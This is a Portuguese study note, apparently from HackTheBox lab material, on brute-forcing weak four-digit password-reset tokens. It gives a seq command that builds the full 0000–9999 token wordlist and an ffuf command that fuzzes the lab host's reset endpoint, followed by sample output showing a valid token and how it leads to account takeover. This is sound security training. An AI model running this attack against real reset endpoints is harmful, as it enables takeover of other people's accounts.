## Fluxo Básico

<img src="../../../_resources/0d233acbe8daf42b36a77e0f7bdc747b.png" alt="0d233acbe8daf42b36a77e0f7bdc747b.png" width="495" height="390" class="jop-noMdConv">

## Identificando tokens fracos

Crie uma conta, solicite o reset e analise o token recebido. Exemplo de e-mail:

> Link: http://weak_reset.htb/reset_password.php?token=7351

Aqui o token é `7351` — um número de 4 dígitos. Há apenas 10.000 combinações possíveis, logo é trivial brute-forcear todos os tokens ativos.

## Atacando tokens fracos (exemplo prático)

1.  Gere uma wordlist de todos os códigos de 0000 a 9999:

`seq -w 0 9999 > tokens.txt`

(`-w` padroniza com zeros à esquerda.)

2.  Verifique as primeiras linhas:

```
head tokens.txt
# 0000
# 0001
# 0002
# ...

```

3.  Se quiser atacar um usuário específico, solicite um reset para ele primeiro (cria o token ativo). Em seguida, brute-forceie o endpoint do reset testando todos os tokens:

`ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"`

4.  Resultado (exemplo):

```
[Status: 200, Size: 2667, ...]
    * FUZZ: 6182

```

Ao descobrir um token válido, você pode usar esse token para concluir o fluxo de redefinição e obter controle da conta correspondente.

&nbsp;

&nbsp;